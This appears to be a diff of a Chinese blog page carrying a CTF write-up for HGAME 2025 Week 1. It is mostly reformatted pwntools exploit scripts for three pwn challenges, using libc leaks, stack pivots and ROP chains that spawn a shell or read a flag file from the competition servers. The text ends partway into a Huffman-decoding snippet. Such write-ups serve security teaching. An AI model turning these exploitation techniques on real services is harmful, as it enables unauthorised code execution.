@@ -19,7 +19,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"summ2.link","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":"mac","style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"summ2.link","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"copycode":{"enable":"mac","style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="counting petals Vulnerabilities  存在越界写入漏洞。">
 <meta property="og:type" content="article">
@@ -285,7 +285,46 @@
 <p>观察栈结构，构造数据使 v9=16 时令 v8,
 v9 为不合法的值，从而泄露栈上的 libc 地址。</p>
 <p>第二次循环时利用任意写，构造 ROP 链。</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = remote(<span class="string">"node2.hgame.vidar.club"</span>,<span class="number">32442</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">e = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">pop_rdi_off = <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi_off = <span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12_off= <span class="number">0x11f2e7</span></span><br><span class="line">p.sendlineafter(<span class="string">"How many flowers have you prepared this time?"</span>,<span class="string">"16"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0x1400000013</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"latter:"</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">b"+ 1 + "</span>)</span><br><span class="line">number = p.recvuntil(<span class="string">b" +"</span>, drop=<span class="literal">True</span>)</span><br><span class="line">number = number.decode().strip()</span><br><span class="line">libc_address = <span class="built_in">int</span>(number)</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_address))</span><br><span class="line">libc_base = libc_address - <span class="number">0x29D90</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">"execve"</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">pop_rdi = libc_base + pop_rdi_off</span><br><span class="line">pop_rsi = libc_base + pop_rsi_off</span><br><span class="line">pop_rdx_r12 = libc_base + pop_rdx_r12_off</span><br><span class="line">p.sendlineafter(<span class="string">"How many flowers have you prepared this time?"</span>,<span class="string">"16"</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0x120000001a</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(pop_rdi)) </span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(binsh_addr))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(pop_rsi))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(pop_rdx_r12))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(binsh_addr))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(sys_addr)) </span><br><span class="line">p.sendlineafter(<span class="string">"latter:"</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+context.log_level = <span class="string">"debug"</span>
+p = remote(<span class="string">"node2.hgame.vidar.club"</span>,<span class="number">32442</span>)
+libc = ELF(<span class="string">"./libc.so.6"</span>)
+e = ELF(<span class="string">"./vuln"</span>)
+pop_rdi_off = <span class="number">0x2a3e5</span>
+pop_rsi_off = <span class="number">0x2be51</span>
+pop_rdx_r12_off= <span class="number">0x11f2e7</span>
+p.sendlineafter(<span class="string">"How many flowers have you prepared this time?"</span>,<span class="string">"16"</span>)
+<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):
+    p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0</span>))
+p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0x1400000013</span>))
+p.sendlineafter(<span class="string">"latter:"</span>,<span class="built_in">str</span>(<span class="number">1</span>))
+p.recvuntil(<span class="string">b"+ 1 + "</span>)
+number = p.recvuntil(<span class="string">b" +"</span>, drop=<span class="literal">True</span>)
+number = number.decode().strip()
+libc_address = <span class="built_in">int</span>(number)
+log.info(<span class="built_in">hex</span>(libc_address))
+libc_base = libc_address - <span class="number">0x29D90</span>
+log.info(<span class="built_in">hex</span>(libc_base))
+sys_addr = libc_base + libc.sym[<span class="string">"execve"</span>]
+binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh"</span>))
+pop_rdi = libc_base + pop_rdi_off
+pop_rsi = libc_base + pop_rsi_off
+pop_rdx_r12 = libc_base + pop_rdx_r12_off
+p.sendlineafter(<span class="string">"How many flowers have you prepared this time?"</span>,<span class="string">"16"</span>)
+pause()
+<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):
+    p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0</span>))
+p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0x120000001a</span>))
+p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(pop_rdi)) 
+p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(binsh_addr))
+p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(pop_rsi))
+p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0</span>))
+p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(pop_rdx_r12))
+p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0</span>))
+p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(binsh_addr))
+p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(sys_addr)) 
+p.sendlineafter(<span class="string">"latter:"</span>,<span class="built_in">str</span>(<span class="number">1</span>))
+p.interactive()</code></pre>
 <h1 id="ezstack">ezstack</h1>
 <p>根据题目所给的 <code>Dockerfile</code> 获取远程环境相应的 libc:</p>
 <p><code>docker build -t pwn:v1 .</code></p>
@@ -301,7 +340,103 @@ v9 为不合法的值，从而泄露栈上的 libc 地址。</p>
 <h2 id="exploit-1">Exploit</h2>
 <p>栈迁移到恰当位置，令 <code>fd=4</code>
 泄露 libc 地址，并调整程序读入的长度，方便后续存放 ROP 链。</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line">p = remote(<span class="string">"node1.hgame.vidar.club"</span>,<span class="number">32351</span>)</span><br><span class="line">e = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line">write_plt = e.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = e.got[<span class="string">'write'</span>]</span><br><span class="line">writable_addr = <span class="number">0x404154</span></span><br><span class="line">read_ret = <span class="number">0x40140f</span></span><br><span class="line">pop_rdi = <span class="number">0x401713</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401711</span></span><br><span class="line">leave_ret = <span class="number">0x401425</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"plt:"</span>,<span class="built_in">hex</span>(write_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"got:"</span>,<span class="built_in">hex</span>(write_got))</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">80</span> + p64(writable_addr) + p64(read_ret)</span><br><span class="line">p.sendafter(<span class="string">"Good luck."</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">payload = flat({</span><br><span class="line">    <span class="number">0x00</span>: [</span><br><span class="line">        p64(writable_addr),</span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(<span class="number">0x4</span>),</span><br><span class="line">        p64(pop_rsi_r15),</span><br><span class="line">        p64(write_got),p64(<span class="number">0</span>),</span><br><span class="line">        p64(write_plt), <span class="comment">#write(4,&lt;write@got&gt;)</span></span><br><span class="line">        p64(read_ret),</span><br><span class="line">        p64(leave_ret),</span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x50</span>: [</span><br><span class="line">        p64(writable_addr-<span class="number">0x50</span>),</span><br><span class="line">        p64(leave_ret),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">p.send(payload)</span><br><span class="line">write_address = u64(p.recvuntil(<span class="string">'\x00\x00'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">libc_base = write_address - <span class="number">0x10e280</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x119431</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2601f</span></span><br><span class="line">_read= libc_base + libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">_<span class="built_in">open</span>= libc_base + libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">_write= libc_base + libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">payload = flat({</span><br><span class="line">    <span class="number">0x00</span>: [</span><br><span class="line">        p64(<span class="number">0x404154</span>+<span class="number">0xd0</span>),</span><br><span class="line">        p64(pop_rsi),</span><br><span class="line">        p64(<span class="number">0x404154</span>),</span><br><span class="line">        p64(pop_rdx_r12),</span><br><span class="line">        p64(<span class="number">0x200</span>),p64(<span class="number">0</span>), </span><br><span class="line">        p64(_read),<span class="comment"># read(4,buf,0x200)</span></span><br><span class="line">        p64(leave_ret),</span><br><span class="line">        p64(leave_ret),</span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x50</span>: [</span><br><span class="line">        p64(writable_addr-<span class="number">0x50</span>),</span><br><span class="line">        p64(leave_ret),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = flat({</span><br><span class="line">    <span class="number">0x00</span>: [</span><br><span class="line">        p64(<span class="number">0xc0ffee</span>),</span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(<span class="number">0x404154</span>+<span class="number">0xe0</span>),</span><br><span class="line">        p64(pop_rsi),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(pop_rdx_r12),</span><br><span class="line">        p64(<span class="number">0</span>),p64(<span class="number">0</span>),</span><br><span class="line">        p64(_<span class="built_in">open</span>), <span class="comment"># open(./flag,0,0)</span></span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(<span class="number">0x5</span>),</span><br><span class="line">        p64(pop_rsi),</span><br><span class="line">        p64(<span class="number">0x404154</span>+<span class="number">0xe0</span>),</span><br><span class="line">        p64(pop_rdx_r12),</span><br><span class="line">        p64(<span class="number">0x100</span>),p64(<span class="number">0</span>),</span><br><span class="line">        p64(_read), <span class="comment">#read(5,buf,0x100)</span></span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(<span class="number">0x4</span>),</span><br><span class="line">        p64(pop_rsi),</span><br><span class="line">        p64(<span class="number">0x404154</span>+<span class="number">0xe0</span>),</span><br><span class="line">        p64(pop_rdx_r12),</span><br><span class="line">        p64(<span class="number">0x30</span>),p64(<span class="number">0</span>),</span><br><span class="line">        p64(_write), <span class="comment">#write(4,buf,0x20)</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0xd0</span>: [</span><br><span class="line">        p64(<span class="number">0x404154</span>),</span><br><span class="line">        p64(leave_ret),</span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0xe0</span>: [</span><br><span class="line">        <span class="string">b'./flag\x00'</span>,</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+context.log_level =<span class="string">"debug"</span>
+p = remote(<span class="string">"node1.hgame.vidar.club"</span>,<span class="number">32351</span>)
+e = ELF(<span class="string">"./vuln"</span>)
+libc = ELF(<span class="string">"./libc-2.31.so"</span>)
+write_plt = e.plt[<span class="string">'write'</span>]
+write_got = e.got[<span class="string">'write'</span>]
+writable_addr = <span class="number">0x404154</span>
+read_ret = <span class="number">0x40140f</span>
+pop_rdi = <span class="number">0x401713</span>
+pop_rsi_r15 = <span class="number">0x401711</span>
+leave_ret = <span class="number">0x401425</span>
+<span class="built_in">print</span>(<span class="string">"plt:"</span>,<span class="built_in">hex</span>(write_plt))
+<span class="built_in">print</span>(<span class="string">"got:"</span>,<span class="built_in">hex</span>(write_got))
+pause()
+payload = <span class="string">b'a'</span> * <span class="number">80</span> + p64(writable_addr) + p64(read_ret)
+p.sendafter(<span class="string">"Good luck."</span>,payload)
+pause()
+payload = flat({
+    <span class="number">0x00</span>: [
+        p64(writable_addr),
+        p64(pop_rdi),
+        p64(<span class="number">0x4</span>),
+        p64(pop_rsi_r15),
+        p64(write_got),p64(<span class="number">0</span>),
+        p64(write_plt), <span class="comment">#write(4,&lt;write@got&gt;)</span>
+        p64(read_ret),
+        p64(leave_ret),
+    ],
+    <span class="number">0x50</span>: [
+        p64(writable_addr-<span class="number">0x50</span>),
+        p64(leave_ret),
+    ]
+})
+p.send(payload)
+write_address = u64(p.recvuntil(<span class="string">'\x00\x00'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))
+libc_base = write_address - <span class="number">0x10e280</span>
+log.info(<span class="built_in">hex</span>(libc_base))
+pop_rdx_r12 = libc_base + <span class="number">0x119431</span>
+pop_rsi = libc_base + <span class="number">0x2601f</span>
+_read= libc_base + libc.symbols[<span class="string">"read"</span>]
+_<span class="built_in">open</span>= libc_base + libc.symbols[<span class="string">"open"</span>]
+_write= libc_base + libc.symbols[<span class="string">"write"</span>]
+payload = flat({
+    <span class="number">0x00</span>: [
+        p64(<span class="number">0x404154</span>+<span class="number">0xd0</span>),
+        p64(pop_rsi),
+        p64(<span class="number">0x404154</span>),
+        p64(pop_rdx_r12),
+        p64(<span class="number">0x200</span>),p64(<span class="number">0</span>), 
+        p64(_read),<span class="comment"># read(4,buf,0x200)</span>
+        p64(leave_ret),
+        p64(leave_ret),
+    ],
+    <span class="number">0x50</span>: [
+        p64(writable_addr-<span class="number">0x50</span>),
+        p64(leave_ret),
+    ]
+})
+pause()
+p.send(payload)
+payload = flat({
+    <span class="number">0x00</span>: [
+        p64(<span class="number">0xc0ffee</span>),
+        p64(pop_rdi),
+        p64(<span class="number">0x404154</span>+<span class="number">0xe0</span>),
+        p64(pop_rsi),
+        p64(<span class="number">0</span>),
+        p64(pop_rdx_r12),
+        p64(<span class="number">0</span>),p64(<span class="number">0</span>),
+        p64(_<span class="built_in">open</span>), <span class="comment"># open(./flag,0,0)</span>
+        p64(pop_rdi),
+        p64(<span class="number">0x5</span>),
+        p64(pop_rsi),
+        p64(<span class="number">0x404154</span>+<span class="number">0xe0</span>),
+        p64(pop_rdx_r12),
+        p64(<span class="number">0x100</span>),p64(<span class="number">0</span>),
+        p64(_read), <span class="comment">#read(5,buf,0x100)</span>
+        p64(pop_rdi),
+        p64(<span class="number">0x4</span>),
+        p64(pop_rsi),
+        p64(<span class="number">0x404154</span>+<span class="number">0xe0</span>),
+        p64(pop_rdx_r12),
+        p64(<span class="number">0x30</span>),p64(<span class="number">0</span>),
+        p64(_write), <span class="comment">#write(4,buf,0x20)</span>
+    ],
+    <span class="number">0xd0</span>: [
+        p64(<span class="number">0x404154</span>),
+        p64(leave_ret),
+    ],
+    <span class="number">0xe0</span>: [
+        <span class="string">b'./flag\x00'</span>,
+    ]
+})
+pause()
+p.send(payload)
+p.interactive()</code></pre>
 <h1 id="format">format</h1>
 <h2 id="vulnerabilities-2">Vulnerabilities</h2>
 <p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210203620876.png"></p>
@@ -316,10 +451,78 @@ v9 为不合法的值，从而泄露栈上的 libc 地址。</p>
 函数的栈帧内写入更长的格式化字符串，然后控制 <code>rbp</code>
 到合适位置，溢出覆盖返回地址为格式化漏洞处，泄露 libc 地址，再次进入
 <code>vuln</code> 构造 ROP 链。</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line">p = remote(<span class="string">"node1.hgame.vidar.club"</span>,<span class="number">30762</span>)</span><br><span class="line">e = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">leave_ret = <span class="number">0x4011ee</span></span><br><span class="line">main = <span class="number">0x4011f0</span></span><br><span class="line">p.sendlineafter(<span class="string">"you have n chance to getshell"</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"type something:"</span>,<span class="string">"%p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"you type: 0x"</span>)</span><br><span class="line">stack_addr = p.recvuntil(<span class="string">b"you have"</span>, drop=<span class="literal">True</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">rbp = stack_addr + <span class="number">0x211c</span></span><br><span class="line">p.sendafter(<span class="string">"n = "</span>,<span class="string">"-1\x00"</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = flat({</span><br><span class="line">    <span class="number">0x00</span>: [</span><br><span class="line">        <span class="string">b'%9$p'</span>,</span><br><span class="line">        p64(rbp),</span><br><span class="line">        p64(<span class="number">0x4012cf</span>),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">p.sendafter(<span class="string">"type something:"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b"0x"</span>,drop=<span class="literal">True</span>)</span><br><span class="line">libc_addr = p.recv(<span class="number">12</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(libc_addr,<span class="number">16</span>)</span><br><span class="line">libc_base = libc_addr - <span class="number">0x29d90</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">payload = flat({</span><br><span class="line">    <span class="number">0x0c</span>: [</span><br><span class="line">        p64(<span class="number">0x40101a</span>),</span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(binsh_addr),</span><br><span class="line">        p64(sys_addr)</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">p.sendafter(<span class="string">"type something:"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+context.log_level =<span class="string">"debug"</span>
+p = remote(<span class="string">"node1.hgame.vidar.club"</span>,<span class="number">30762</span>)
+e = ELF(<span class="string">"./vuln"</span>)
+libc = ELF(<span class="string">"./libc.so.6"</span>)
+leave_ret = <span class="number">0x4011ee</span>
+main = <span class="number">0x4011f0</span>
+p.sendlineafter(<span class="string">"you have n chance to getshell"</span>,<span class="built_in">str</span>(<span class="number">1</span>))
+p.sendlineafter(<span class="string">"type something:"</span>,<span class="string">"%p"</span>)
+p.recvuntil(<span class="string">b"you type: 0x"</span>)
+stack_addr = p.recvuntil(<span class="string">b"you have"</span>, drop=<span class="literal">True</span>)
+stack_addr = <span class="built_in">int</span>(stack_addr,<span class="number">16</span>)
+log.info(<span class="built_in">hex</span>(stack_addr))
+rbp = stack_addr + <span class="number">0x211c</span>
+p.sendafter(<span class="string">"n = "</span>,<span class="string">"-1\x00"</span>)
+pause()
+payload = flat({
+    <span class="number">0x00</span>: [
+        <span class="string">b'%9$p'</span>,
+        p64(rbp),
+        p64(<span class="number">0x4012cf</span>),
+    ]
+})
+p.sendafter(<span class="string">"type something:"</span>,payload)
+p.recvuntil(<span class="string">b"0x"</span>,drop=<span class="literal">True</span>)
+libc_addr = p.recv(<span class="number">12</span>)
+libc_addr = <span class="built_in">int</span>(libc_addr,<span class="number">16</span>)
+libc_base = libc_addr - <span class="number">0x29d90</span>
+log.info(<span class="built_in">hex</span>(libc_base))
+
+binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh"</span>))
+sys_addr = libc_base + libc.sym[<span class="string">"system"</span>]
+pop_rdi = libc_base + <span class="number">0x2a3e5</span>
+payload = flat({
+    <span class="number">0x0c</span>: [
+        p64(<span class="number">0x40101a</span>),
+        p64(pop_rdi),
+        p64(binsh_addr),
+        p64(sys_addr)
+    ]
+})
+p.sendafter(<span class="string">"type something:"</span>,payload)
+p.interactive()</code></pre>
 <h1 id="compress-dot-new">Compress dot new</h1>
 <p>题目给出 Nushell 编写的 Huffman 编码，解码代码如下</p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def "decode" [tree encoded] {</span><br><span class="line">    let bits = ($encoded | split chars)</span><br><span class="line">    mut result = []</span><br><span class="line">    mut current_node = $tree</span><br><span class="line">    for bit in $bits {</span><br><span class="line">        $current_node = if $bit == '0' {</span><br><span class="line">            $current_node.a</span><br><span class="line">        } else { 